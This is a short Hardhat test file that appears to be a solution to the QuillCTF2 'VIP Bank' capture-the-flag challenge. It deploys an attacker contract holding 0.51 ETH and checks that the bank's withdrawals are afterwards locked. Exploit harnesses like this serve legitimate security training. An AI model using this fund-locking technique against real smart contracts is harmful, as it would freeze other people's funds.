describe('QuillCTF2: VIP Bank', () => {
  let contract;
  let attackerContract;
  let owner;
  let attacker;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    contract = await ethers.getContractFactory('VIPBank', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should add VIP & deposit some funds', async () => {
    await contract.addVIP(owner.address);
    await contract.deposit({value: parseEther('0.025')});
  });

  it('should lock funds', async () => {
    attackerContract = await ethers
      .getContractFactory('VIPBankAttacker', attacker)
      .then(f => f.deploy(contract.address, {value: parseEther('0.51')}));
    await attackerContract.deployed();

    await expect(contract.withdraw(parseEther('0.001'))).to.be.revertedWith(
      'Cannot withdraw more than 0.5 ETH per transaction'
    );
  });
})